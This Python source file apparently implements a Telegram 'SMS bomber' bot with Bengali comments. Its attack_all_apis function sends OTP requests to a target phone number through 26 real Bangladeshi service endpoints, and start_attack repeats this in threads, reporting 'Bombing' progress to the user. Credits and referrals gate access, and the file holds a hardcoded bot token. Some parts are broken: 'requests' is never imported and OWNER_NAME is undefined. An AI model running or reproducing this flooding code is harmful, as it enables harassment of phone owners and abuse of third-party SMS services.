import telebot
import threading
import time
import json
import random
import string
import os
from flask import Flask
from telebot import types

# ==========================================
# 🔧 CONFIGURATION
# ==========================================
API_TOKEN = '8577991344:AAGdkMNIt1v-bSBgsQKQSjGOtaklWAYn5NI' # আপনার টোকেন দিন
OWNER_ID = 6941003064             # আপনার টেলিগ্রাম আইডি (সংখ্যা)
CHANNEL_ID = "@SH_tricks"         # আপনার চ্যানেল
DATA_FILE = 'users_data.json'

bot = telebot.TeleBot(API_TOKEN)

# ==========================================
# 💾 DATABASE MANAGER (Simple JSON)
# ==========================================
def load_data():
    if not os.path.exists(DATA_FILE):
        return {"users": {}, "codes": [], "banned": []}
    try:
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    except:
        return {"users": {}, "codes": [], "banned": []}

def save_data(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=4)

db = load_data()

# ==========================================
# 🌐 WEB SERVER (Render-এর জন্য)
# ==========================================
app = Flask('')

@app.route('/')
def home():
    return "Bot is Running Successfully with 27+ APIs!"

def run_web_server():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = threading.Thread(target=run_web_server)
    t.daemon = True
    t.start()
    
# ==========================================
# 🛡️ HELPER FUNCTIONS
# ==========================================
def get_user(user_id):
    str_id = str(user_id)
    if str_id not in db['users']:
        # নতুন ইউজারকে ৫ ক্রেডিট বোনাস
        db['users'][str_id] = {"credits": 5, "joined_at": time.time()}
        save_data(db)
    return db['users'][str_id]

def is_joined(user_id):
    try:
        status = bot.get_chat_member(CHANNEL_ID, user_id).status
        return status in ['member', 'administrator', 'creator']
    except:
        return False # চ্যানেল না পেলে বা এরর হলে False

# ==========================================
# 🌐 API ENGINE (ALL APIs ADDED)
# ==========================================
def api_hit(url, method, data=None, json=None, headers=None):
    try:
        head = {"User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"}
        if headers: head.update(headers)
        
        if method == "POST":
            requests.post(url, data=data, json=json, headers=head, timeout=4)
        else:
            requests.get(url, headers=head, timeout=4)
    except: pass

def attack_all_apis(target):
    # 1. Apex
    api_hit("https://api.apex4u.com/api/auth/login", "POST", json={"phoneNumber": target})
    # 2. ShopBase
    api_hit("https://shopbasebd.com/store/registration/sendOTP", "POST", data={"number": target, "_token": "ktrqcmKSAn8cP3vZvw3xkbav2ww65eRvaikWKDFo"})
    # 3. Bikroy
    api_hit(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={target}", "GET")
    # 4. Banglalink
    api_hit("https://web-api.banglalink.net/api/v1/user/otp-login/request", "POST", json={"mobile": target})
    # 5. GP
    api_hit("https://webloginda.grameenphone.com/backend/api/v1/otp", "POST", data={"msisdn": target})
    # 6. Airtel
    api_hit("https://www.bd.airtel.com/en", "POST", data=f'[{{"msisdn":"{target}"}}]', headers={"next-action": "7f9bab0f2f1355e3d2075f08076c20bed3e9ff8d7e"})
    # 7. Jatri
    api_hit("https://api.retail.jatri.co/auth/api/v1/send-otp", "POST", json={"phone": target, "purpose": "USER_LOGIN", "deviceType": "WEB"})
    # 8. Chaldal
    api_hit(f"https://chaldal.com/yolk/api-v4/Auth/RequestOtpVerificationWithApiKey?apiKey=0cAFcWeA6egvAsgG1hCZ6i...&phoneNumber=%2B88{target}", "POST")
    # 9. Toffee
    api_hit("https://prod-services.toffeelive.com/sms/v1/subscriber/otp", "POST", json={"target": "88"+target, "resend": False})
    # 10. Chorki
    api_hit("https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", "POST", json={"number": "+88"+target})
    # 11. Hoichoi
    api_hit("https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code", "POST", json={"phoneNumber": "+88"+target, "platform": "MOBILE_WEB"})
    # 12. Bioscope
    api_hit("https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web", "POST", json={"number": "+88"+target})
    # 13. Shikho
    api_hit("https://api.shikho.com/auth/v2/send/sms", "POST", json={"phone": "88"+target, "type": "student"})
    # 14. Bohubrihi
    api_hit("https://bb-api.bohubrihi.com/public/activity/otp", "POST", json={"phone": target, "intent": "login"})
    # 15. Ostad
    api_hit("https://api.ostad.app/api/v2/user/with-otp", "POST", json={"msisdn": target})
    # 16. Coke Studio
    api_hit("https://cokestudio23.sslwireless.com/api/store-and-send-otp", "POST", json={"msisdn": "88"+target, "name": "User"})
    # 17. Rabbithole
    api_hit("https://apix.rabbitholebd.com/appv2/login/requestOTP", "POST", json={"mobile": "+88"+target})
    # 18. Osudpotro
    api_hit("https://api.osudpotro.com/api/v1/users/send_otp", "POST", json={"mobile": "+88-"+target, "deviceToken": "web"})
    # 19. Fundesh
    api_hit(f"https://fundesh.com.bd/api/auth/generateOTP", "POST", json={"msisdn": "88"+target})
    # 20. Swap
    api_hit("https://api.swap.com.bd/api/v1/send-otp", "POST", json={"phone": target})
    # 21. Rokomari
    api_hit(f"https://www.rokomari.com/otp/send?emailOrPhone=88{target}", "GET")
    # 22. eCourier
    api_hit(f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={target}", "GET")
    # 23. Paragon Food
    api_hit("https://api.paragonfood.com.bd/auth/customerlogin", "POST", json={"emailOrPhone": target})
    # 24. Viewlift
    api_hit("https://prod-api.viewlift.com/identity/signup?site=prothomalo", "POST", json={"requestType":"send","phoneNumber":"+88"+target})
    # 25. Eonbazar
    api_hit("https://app.eonbazar.com/api/auth/register", "POST", json={"mobile": target, "name": "User"})
    # 26. Sundarban
    api_hit("https://tracking.sundarbancourierltd.com/PreBooking/SendPin", "POST", json={"PreBookingRegistrationPhoneNumber": target})

# ==========================================
# 💣 ATTACK MANAGER
# ==========================================
def start_attack(chat_id, target, amount):
    msg = bot.send_message(chat_id, "System Initializing... 🚀")
    time.sleep(1)
    
    bot.edit_message_text(f"🚀 Attack Launched!\n\n🎯 Target: {target}\n💣 Amount: {amount}\n☠️ Status: Bombing...", chat_id, msg.message_id)
    
    sent = 0
    for i in range(amount):
        threading.Thread(target=attack_all_apis, args=(target,)).start()
        sent += 1
        
        if sent % 5 == 0:
            try:
                bot.edit_message_text(f"💣 Bombing in Progress...\n\n🎯 Target: {target}\n🔥 Sent: {sent}/{amount}\n⚡ APIs: 27+", chat_id, msg.message_id)
            except: pass
        time.sleep(1)

    bot.edit_message_text(f"✅ Mission Completed!\n\n🎯 Target: {target}\n🔥 Total Sent: {sent}\n👑 Power By: {OWNER_NAME}", chat_id, msg.message_id)

# ==========================================
# 🤖 BOT COMMANDS & MENU
# ==========================================

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = str(message.from_user.id)
    
    # --- REFERRAL SYSTEM ---
    # যদি ইউজার নতুন হয় এবং লিংকে রেফার কোড থাকে
    args = message.text.split()
    if user_id not in db['users']:
        referrer = None
        if len(args) > 1:
            referrer = args[1]
            if referrer != user_id and referrer in db['users']:
                # রেফারারকে ৫ ক্রেডিট বোনাস
                db['users'][referrer]['credits'] += 5
                try:
                    bot.send_message(referrer, "🎉 নতুন রেফারাল! আপনি ৫ ক্রেডিট পেয়েছেন।")
                except: pass
        
        # নতুন ইউজার ডাটাবেসে সেভ (রেফারার সহ)
        db['users'][user_id] = {"credits": 5, "joined_at": time.time(), "invited_by": referrer}
        save_data(db)
    # -----------------------

    # মেইন মেনু বাটন
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn1 = types.KeyboardButton("🚀 Service Start") # এখানে আপনার বৈধ সার্ভিস বাটন হবে
    btn2 = types.KeyboardButton("💰 Redeem Code")
    btn3 = types.KeyboardButton("👥 Refer & Earn")
    btn4 = types.KeyboardButton("💳 My Balance")
    markup.add(btn1, btn2, btn3, btn4)

    welcome_text = f"স্বাগতম {message.from_user.first_name}!\nআপনার বর্তমান ব্যালেন্স: {db['users'][user_id]['credits']} Credits."
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup)

# --- 1. SERVICE HANDLER (Safe Version) ---
@bot.message_handler(func=lambda message: message.text == "🚀 Service Start")
def service_handler(message):
    user_id = str(message.from_user.id)
    
    # চ্যানেল জয়েন চেক
    if not is_joined(message.from_user.id):
        bot.reply_to(message, f"⚠️ দয়া করে প্রথমে আমাদের চ্যানেলে জয়েন করুন: {CHANNEL_ID}")
        return

    # ব্যান চেক
    if user_id in db['banned']:
        bot.reply_to(message, "🚫 আপনি এই বটের জন্য ব্যানড।")
        return

    # ক্রেডিট চেক
    if db['users'][user_id]['credits'] > 0:
        # ক্রেডিট কাটবে
        db['users'][user_id]['credits'] -= 1
        save_data(db)
        bot.reply_to(message, "✅ সার্ভিস চালু হয়েছে! (১ ক্রেডিট কাটা হয়েছে)")
        # এখানে আপনার মূল লজিক (নিরাপদ) বসাতে পারেন
    else:
        bot.reply_to(message, "⚠️ পর্যাপ্ত ক্রেডিট নেই! রেফার করুন বা কোড রিডিম করুন।")

# --- 2. REDEEM CODE HANDLER ---
@bot.message_handler(func=lambda message: message.text == "💰 Redeem Code")
def redeem_handler(message):
    msg = bot.reply_to(message, "🎁 আপনার রিডিম কোডটি লিখুন:")
    bot.register_next_step_handler(msg, process_redeem_code)

def process_redeem_code(message):
    code = message.text.strip()
    user_id = str(message.from_user.id)
    
    if code in db['codes']:
        db['codes'].remove(code) # কোড একবার ব্যবহার হলে মুছে যাবে
        db['users'][user_id]['credits'] += 10 # ১০ ক্রেডিট যোগ হবে
        save_data(db)
        bot.reply_to(message, "✅ সফল! ১০ ক্রেডিট যোগ হয়েছে।")
    else:
        bot.reply_to(message, "❌ ভুল অথবা মেয়াদোত্তীর্ণ কোড।")

# --- 3. REFER LINK HANDLER ---
@bot.message_handler(func=lambda message: message.text == "👥 Refer & Earn")
def refer_link(message):
    user_id = str(message.from_user.id)
    bot_username = bot.get_me().username
    link = f"https://t.me/{bot_username}?start={user_id}"
    text = f"🎁 **Refer & Earn**\n\nআপনার লিংক:\n`{link}`\n\nপ্রতি রেফারে পাবেন +৫ ক্রেডিট!"
    bot.reply_to(message, text, parse_mode='Markdown')

# --- 4. BALANCE CHECK ---
@bot.message_handler(func=lambda message: message.text == "💳 My Balance")
def check_balance(message):
    user_id = str(message.from_user.id)
    creds = db['users'][user_id]['credits']
    bot.reply_to(message, f"💳 আপনার বর্তমান ব্যালেন্স: **{creds}** Credits", parse_mode='Markdown')

# ==========================================
# 👑 ADMIN COMMANDS (Advanced Features)
# ==========================================

# অ্যাডমিন প্যানেল চেক
def is_admin(user_id):
    return user_id == OWNER_ID

@bot.message_handler(commands=['admin', 'addcredit', 'gencodes', 'stats', 'broadcast'])
def admin_panel(message):
    if not is_admin(message.from_user.id):
        return # অ্যাডমিন না হলে চুপ থাকবে

    cmd = message.text.split()[0]
    args = message.text.split()

    # 1. Generate Redeem Codes (/gencodes 5)
    if cmd == '/gencodes':
        try:
            amount = int(args[1])
            new_codes = []
            for _ in range(amount):
                # Random code generation
                code = "GIFT-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
                new_codes.append(code)
            
            db['codes'].extend(new_codes)
            save_data(db)
            
            # ফাইল হিসেবে পাঠানো
            with open("codes.txt", "w") as f:
                f.write("\n".join(new_codes))
            with open("codes.txt", "rb") as f:
                bot.send_document(message.chat.id, f, caption=f"✅ {amount} টি কোড জেনারেট হয়েছে।")
            os.remove("codes.txt")
        except:
            bot.reply_to(message, "ব্যবহার: /gencodes <amount>")

    # 2. Add Credits (/addcredit UserID Amount)
    elif cmd == '/addcredit':
        try:
            target_id = args[1]
            amount = int(args[2])
            if target_id in db['users']:
                db['users'][target_id]['credits'] += amount
                save_data(db)
                bot.reply_to(message, f"✅ {target_id} কে {amount} ক্রেডিট দেওয়া হয়েছে।")
                try: bot.send_message(target_id, f"🎁 অ্যাডমিন আপনাকে {amount} ক্রেডিট দিয়েছে!")
                except: pass
            else:
                bot.reply_to(message, "❌ ইউজার পাওয়া যায়নি।")
        except:
            bot.reply_to(message, "ব্যবহার: /addcredit <UserID> <Amount>")

    # 3. Bot Stats (/stats)
    elif cmd == '/stats':
        total_users = len(db['users'])
        active_codes = len(db['codes'])
        bot.reply_to(message, f"📊 **Bot Statistics**\n\n👤 Total Users: {total_users}\n🎟 Active Codes: {active_codes}")

    # 4. Broadcast (/broadcast Message)
    elif cmd == '/broadcast':
        msg = message.text.replace("/broadcast", "").strip()
        if not msg:
            bot.reply_to(message, "মেসেজ লিখুন।")
            return
        
        count = 0
        for uid in db['users']:
            try:
                bot.send_message(uid, f"📢 **NOTICE:**\n{msg}", parse_mode='Markdown')
                count += 1
            except: pass
        bot.reply_to(message, f"✅ {count} জন ইউজারকে মেসেজ পাঠানো হয়েছে।")

# ==========================================
# 🔥 RUNNER
# ==========================================
if __name__ == "__main__":
    try:
        bot.remove_webhook()
    except: pass
    
    keep_alive() # Render Support
    print("✅ Bot is Running...")
    bot.polling(non_stop=True)
